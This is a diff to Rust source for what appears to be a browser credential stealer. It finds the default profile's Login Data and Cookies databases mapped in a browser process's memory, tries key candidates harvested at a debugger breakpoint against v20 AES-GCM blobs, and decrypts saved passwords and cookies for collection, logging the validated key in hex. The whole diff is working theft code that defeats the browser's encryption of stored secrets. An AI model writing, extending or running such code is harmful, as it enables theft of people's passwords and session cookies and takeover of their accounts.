@@ -100,7 +100,7 @@ pub fn find_default_profile_file(h: HANDLE, file_name: &str) -> Option<Vec<u8>> 
                 if base.eq_ignore_ascii_case(file_name)
                     && full.to_lowercase().contains("\\default\\")
                 {
-                    println!(
+                    crate::log_out!(
                         "[+] Found {file_name} mapped at {:#x} ({full})",
                         mbi.BaseAddress as usize
                     );
@@ -146,10 +146,66 @@ fn text(row: &rusqlite::Row<'_>, index: usize) -> String {
         .unwrap_or_default()
 }
 
-pub fn extract_logins(browser: &'static str, image: &[u8], key: &[u8; 32]) -> Vec<LoginRow> {
+/// A plausible key harvested at the breakpoint, tagged with where it came from.
+pub struct KeyCandidate {
+    pub label: String,
+    pub key: [u8; 32],
+}
+
+/// The register layout at the breakpoint shifts between browser versions, so
+/// instead of trusting one register we try every harvested candidate against
+/// a real encrypted blob; the AES-GCM tag only verifies for the true key.
+/// The first candidate that decrypts anything wins and is reused afterwards.
+fn pick_key(
+    candidates: &[KeyCandidate],
+    blob: &[u8],
+    winner: &mut Option<usize>,
+) -> Option<Vec<u8>> {
+    if let Some(i) = *winner {
+        if let Ok(plain) = crypto::decrypt_v20(&candidates[i].key, blob) {
+            return Some(plain);
+        }
+    }
+    for (i, candidate) in candidates.iter().enumerate() {
+        if Some(i) == *winner {
+            continue;
+        }
+        if let Ok(plain) = crypto::decrypt_v20(&candidate.key, blob) {
+            *winner = Some(i);
+            return Some(plain);
+        }
+    }
+    None
+}
+
+fn report_winner(candidates: &[KeyCandidate], winner: &Option<usize>, had_winner: bool) {
+    if !had_winner {
+        if let Some(i) = winner {
+            let candidate = &candidates[*i];
+            crate::log_out!(
+                "[+] Validated key candidate from {}: {}",
+                candidate.label,
+                crypto::to_hex(&candidate.key)
+            );
+        }
+    }
+}
+
+fn dump_unvalidated(candidates: &[KeyCandidate]) {
+    crate::log_err!("[!] No key candidate validated against any encrypted blob:");
+    for candidate in candidates {
+        crate::log_err!("    {}: {}", candidate.label, crypto::to_hex(&candidate.key));
+    }
+}
+
+pub fn extract_logins(
+    browser: &'static str,
+    image: &[u8],
+    candidates: &[KeyCandidate],
+) -> Vec<LoginRow> {
     let mut out = Vec::new();
     let Some(conn) = open_image(image) else {
-        eprintln!("[-] Failed to open the Login Data database image");
+        crate::log_err!("[-] Failed to open the Login Data database image");
         return out;
     };
 
@@ -157,24 +213,29 @@ pub fn extract_logins(browser: &'static str, image: &[u8], key: &[u8; 32]) -> Ve
         "SELECT origin_url, username_value, password_value, date_created, date_last_used, \
          date_password_modified FROM logins",
     ) else {
-        eprintln!("[-] Failed to query the logins table");
+        crate::log_err!("[-] Failed to query the logins table");
         return out;
     };
 
     let Ok(mut rows) = stmt.query([]) else {
-        eprintln!("[-] Failed to read rows from the logins table");
+        crate::log_err!("[-] Failed to read rows from the logins table");
         return out;
     };
 
+    let mut winner: Option<usize> = None;
+    let mut saw_blob = false;
     while let Ok(Some(row)) = rows.next() {
         let blob: Vec<u8> = row.get(2).unwrap_or_default();
         if blob.is_empty() {
             continue;
         }
-        let Ok(plain) = crypto::decrypt_v20(key, &blob) else {
-            eprintln!("[-] Failed to decrypt a saved password");
+        saw_blob = true;
+        let had_winner = winner.is_some();
+        let Some(plain) = pick_key(candidates, &blob, &mut winner) else {
+            crate::log_err!("[-] Failed to decrypt a saved password");
             continue;
         };
+        report_winner(candidates, &winner, had_winner);
         out.push(LoginRow {
             browser,
             origin_url: text(row, 0),
@@ -186,13 +247,21 @@ pub fn extract_logins(browser: &'static str, image: &[u8], key: &[u8; 32]) -> Ve
         });
     }
 
+    if saw_blob && winner.is_none() {
+        dump_unvalidated(candidates);
+    }
+
     out
 }
 
-pub fn extract_cookies(browser: &'static str, image: &[u8], key: &[u8; 32]) -> Vec<CookieRow> {
+pub fn extract_cookies(
+    browser: &'static str,
+    image: &[u8],
+    candidates: &[KeyCandidate],
+) -> Vec<CookieRow> {
     let mut out = Vec::new();
     let Some(conn) = open_image(image) else {
-        eprintln!("[-] Failed to open the Cookies database image");
+        crate::log_err!("[-] Failed to open the Cookies database image");
         return out;
     };
 
@@ -200,24 +269,29 @@ pub fn extract_cookies(browser: &'static str, image: &[u8], key: &[u8; 32]) -> V
         "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, \
          creation_utc, last_access_utc, last_update_utc FROM cookies",
     ) else {
-        eprintln!("[-] Failed to query the cookies table");
+        crate::log_err!("[-] Failed to query the cookies table");
         return out;
     };
 
     let Ok(mut rows) = stmt.query([]) else {
-        eprintln!("[-] Failed to read rows from the cookies table");
+        crate::log_err!("[-] Failed to read rows from the cookies table");
         return out;
     };
 
+    let mut winner: Option<usize> = None;
+    let mut saw_blob = false;
     while let Ok(Some(row)) = rows.next() {
         let blob: Vec<u8> = row.get(6).unwrap_or_default();
         if blob.is_empty() {
             continue;
         }
-        let Ok(plain) = crypto::decrypt_v20(key, &blob) else {
-            eprintln!("[-] Failed to decrypt a cookie");
+        saw_blob = true;
+        let had_winner = winner.is_some();
+        let Some(plain) = pick_key(candidates, &blob, &mut winner) else {
+            crate::log_err!("[-] Failed to decrypt a cookie");
             continue;
         };
+        report_winner(candidates, &winner, had_winner);
         if plain.len() <= COOKIE_PLAINTEXT_HEADER {
             continue;
         }
@@ -235,6 +309,10 @@ pub fn extract_cookies(browser: &'static str, image: &[u8], key: &[u8; 32]) -> V
             last_access: row.get(8).unwrap_or(0),
             last_update: row.get(9).unwrap_or(0),
         });
+    }
+
+    if saw_blob && winner.is_none() {
+        dump_unvalidated(candidates);
     }
 
     out
